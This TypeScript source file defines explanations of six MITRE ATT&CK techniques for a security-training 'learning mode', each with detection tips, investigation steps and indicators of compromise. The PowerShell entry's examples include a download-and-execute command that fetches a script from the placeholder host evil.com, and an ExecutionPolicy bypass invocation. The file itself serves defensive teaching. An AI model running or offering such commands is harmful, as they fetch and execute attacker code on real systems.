// MITRE ATT&CK technique explanations for learning mode

export interface MitreTechnique {
  id: string;
  name: string;
  tactic: string;
  description: string;
  url: string;
}

export interface DetailedMitreTechnique extends MitreTechnique {
  examples: string[];
  detectionTips: string[];
  investigationSteps: string[];
  commonIOCs: string[];
  realWorldExamples: string[];
}

export const DETAILED_MITRE_TECHNIQUES: Record<string, DetailedMitreTechnique> = {
  'T1059.001': {
    id: 'T1059.001',
    name: 'PowerShell',
    tactic: 'Execution',
    description: 'Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.',
    url: 'https://attack.mitre.org/techniques/T1059/001/',
    examples: [
      'powershell.exe -enc [base64 encoded command]',
      'powershell.exe -ExecutionPolicy Bypass -File malicious.ps1',
      'powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://evil.com/payload.ps1\')"',
    ],
    detectionTips: [
      'Look for PowerShell execution from unusual parent processes (e.g., Word.exe, Excel.exe)',
      'Check for base64 encoded commands in process command lines',
      'Monitor for PowerShell execution with -ExecutionPolicy Bypass flag',
      'Watch for PowerShell downloading content from external URLs',
      'Look for PowerShell spawning network connections to external IPs',
    ],
    investigationSteps: [
      '1. Identify the parent process that launched PowerShell',
      '2. Examine the command line arguments for suspicious patterns',
      '3. Check if PowerShell is connecting to external IPs',
      '4. Look for file creation/modification by PowerShell',
      '5. Review PowerShell execution logs and script block logging',
      '6. Check for base64 encoded strings in command lines',
    ],
    commonIOCs: [
      'Base64 encoded commands',
      'External IP connections from PowerShell',
      'Suspicious file paths in command lines',
      'Unusual parent processes (Office applications, browsers)',
      'PowerShell with -ExecutionPolicy Bypass',
    ],
    realWorldExamples: [
      'Emotet malware uses PowerShell to download and execute additional payloads',
      'APT groups use PowerShell for lateral movement and data exfiltration',
      'Ransomware often uses PowerShell to disable security controls before encryption',
    ],
  },
  'T1071.001': {
    id: 'T1071.001',
    name: 'Web Protocols',
    tactic: 'Command and Control',
    description: 'Adversaries may communicate using application layer protocols to avoid detection. This includes HTTP/HTTPS traffic to command and control servers.',
    url: 'https://attack.mitre.org/techniques/T1071/001/',
    examples: [
      'Regular HTTP POST requests to external IP every 60 seconds',
      'HTTPS connections to suspicious domains',
      'GET requests with encoded data in query parameters',
      'HTTP requests with unusual User-Agent strings',
    ],
    detectionTips: [
      'Look for periodic connections to external IPs (beaconing)',
      'Check for small, consistent byte transfers (C2 heartbeat)',
      'Monitor for connections to known malicious IPs/domains',
      'Watch for unusual User-Agent strings',
      'Look for encrypted traffic to suspicious destinations',
    ],
    investigationSteps: [
      '1. Identify the source IP making the connections',
      '2. Check the destination IP against threat intelligence feeds',
      '3. Analyze the timing pattern (is it periodic/beaconing?)',
      '4. Examine the byte counts (small = heartbeat, large = data exfil)',
      '5. Review the User-Agent and HTTP headers',
      '6. Check if the destination IP is in threat intelligence databases',
    ],
    commonIOCs: [
      'Periodic connections every 60-300 seconds',
      'Small byte counts (100-500 bytes)',
      'External IP addresses not in whitelist',
      'Suspicious User-Agent strings',
      'Connections during off-hours',
    ],
    realWorldExamples: [
      'Cobalt Strike beacons communicate every 60 seconds with small HTTP POST requests',
      'APT groups use HTTPS to blend in with normal web traffic',
      'Ransomware C2 servers receive status updates via HTTP',
    ],
  },
  'T1048': {
    id: 'T1048',
    name: 'Exfiltration Over Alternative Protocol',
    tactic: 'Exfiltration',
    description: 'Adversaries may steal data by exfiltrating it over a different protocol than the command and control channel. This helps avoid detection.',
    url: 'https://attack.mitre.org/techniques/T1048/',
    examples: [
      'Large outbound data transfers to external IPs',
      'FTP uploads to suspicious servers',
      'DNS tunneling for data exfiltration',
      'ICMP tunneling for covert data transfer',
    ],
    detectionTips: [
      'Look for unusually large outbound data transfers',
      'Monitor for connections to external IPs with high byte counts',
      'Check for off-hours data transfers',
      'Watch for encrypted connections with large payloads',
      'Look for transfers to countries not typically used for business',
    ],
    investigationSteps: [
      '1. Identify the source of the large transfer',
      '2. Check the destination IP and country',
      '3. Analyze the timing (off-hours is suspicious)',
      '4. Examine the protocol used (HTTP, FTP, etc.)',
      '5. Review what files were accessed before the transfer',
      '6. Check if the destination IP is known malicious',
    ],
    commonIOCs: [
      'Large outbound byte counts (>10MB)',
      'External IP addresses',
      'Off-hours activity',
      'Unusual protocols (FTP, DNS)',
      'High-frequency transfers',
    ],
    realWorldExamples: [
      'APT groups exfiltrate stolen credentials via HTTPS to cloud storage',
      'Insider threats use FTP to upload sensitive documents',
      'Ransomware groups exfiltrate data before encryption',
    ],
  },
  'T1021.002': {
    id: 'T1021.002',
    name: 'SMB/Windows Admin Shares',
    tactic: 'Lateral Movement',
    description: 'Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). This allows them to move laterally across the network.',
    url: 'https://attack.mitre.org/techniques/T1021/002/',
    examples: [
      'SMB connections to multiple hosts in short time',
      'Access to admin shares (C$, ADMIN$)',
      'SMB connections from non-admin workstations',
      'After-hours SMB access',
    ],
    detectionTips: [
      'Monitor for SMB connections to multiple hosts',
      'Check for access to admin shares from non-admin accounts',
      'Look for SMB connections during off-hours',
      'Watch for rapid lateral movement (many hosts in short time)',
      'Monitor for SMB connections from compromised hosts',
    ],
    investigationSteps: [
      '1. Identify the source host making SMB connections',
      '2. List all destination hosts accessed',
      '3. Check the timing (is it during business hours?)',
      '4. Verify if the account has legitimate access',
      '5. Review what shares were accessed',
      '6. Check for file operations on remote shares',
    ],
    commonIOCs: [
      'Multiple SMB connections in short time',
      'Access to admin shares (C$, ADMIN$)',
      'Off-hours SMB activity',
      'SMB from compromised host',
      'Unusual user accounts accessing shares',
    ],
    realWorldExamples: [
      'WannaCry ransomware used SMB to spread across networks',
      'APT groups use SMB for lateral movement after initial compromise',
      'Ransomware groups use SMB to encrypt network shares',
    ],
  },
  'T1078': {
    id: 'T1078',
    name: 'Valid Accounts',
    tactic: 'Defense Evasion, Persistence, Privilege Escalation, Initial Access',
    description: 'Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.',
    url: 'https://attack.mitre.org/techniques/T1078/',
    examples: [
      'Login from unusual geographic location',
      'Login during off-hours',
      'Privileged account login from non-privileged workstation',
      'Multiple failed login attempts followed by success',
    ],
    detectionTips: [
      'Monitor for logins from new geographic locations',
      'Check for off-hours login activity',
      'Watch for privileged account usage',
      'Look for login patterns that differ from normal behavior',
      'Monitor for successful logins after multiple failures',
    ],
    investigationSteps: [
      '1. Identify the user account',
      '2. Check the source IP and geographic location',
      '3. Review login history for this account',
      '4. Verify if the login time is normal for this user',
      '5. Check what resources were accessed after login',
      '6. Review for any suspicious activity post-login',
    ],
    commonIOCs: [
      'New geographic location',
      'Off-hours login',
      'Privileged account from non-privileged host',
      'Multiple failed attempts before success',
      'Unusual login patterns',
    ],
    realWorldExamples: [
      'Credential stuffing attacks use stolen credentials',
      'APT groups use compromised admin accounts',
      'Insider threats abuse their legitimate credentials',
    ],
  },
  'T1566.001': {
    id: 'T1566.001',
    name: 'Phishing: Spearphishing Attachment',
    tactic: 'Initial Access',
    description: 'Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems.',
    url: 'https://attack.mitre.org/techniques/T1566/001/',
    examples: [
      'Email with malicious Word document attachment',
      'Macro-enabled Excel file from external sender',
      'PDF with embedded malicious code',
      'Email attachment that executes when opened',
    ],
    detectionTips: [
      'Monitor email logs for suspicious attachments',
      'Check for macro-enabled Office documents',
      'Look for emails from external senders with attachments',
      'Watch for file execution immediately after email receipt',
      'Monitor for network connections after email attachment opened',
    ],
    investigationSteps: [
      '1. Identify the email and sender',
      '2. Check the attachment type and hash',
      '3. Review if the attachment was opened/executed',
      '4. Look for processes spawned after attachment open',
      '5. Check for network connections after execution',
      '6. Review email headers for spoofing indicators',
    ],
    commonIOCs: [
      'Suspicious email attachments',
      'Macro-enabled Office documents',
      'External email senders',
      'File execution after email receipt',
      'Network connections after attachment open',
    ],
    realWorldExamples: [
      'Emotet uses malicious Word documents with macros',
      'APT groups send spearphishing emails with custom malware',
      'Ransomware often starts with phishing emails',
    ],
  },
};

export function getDetailedMitreTechnique(id: string): DetailedMitreTechnique | undefined {
  return DETAILED_MITRE_TECHNIQUES[id];
}

export function getTechniqueExplanation(id: string): string {
  const technique = DETAILED_MITRE_TECHNIQUES[id];
  if (!technique) return '';
  
  return `
**${technique.name} (${technique.id})**

**Tactic:** ${technique.tactic}

**Description:** ${technique.description}

**What to Look For:**
${technique.detectionTips.map(tip => `• ${tip}`).join('\n')}

**Investigation Steps:**
${technique.investigationSteps.join('\n')}

**Common Indicators:**
${technique.commonIOCs.map(ioc => `• ${ioc}`).join('\n')}

**Real-World Examples:**
${technique.realWorldExamples.map(ex => `• ${ex}`).join('\n')}
  `.trim();
}

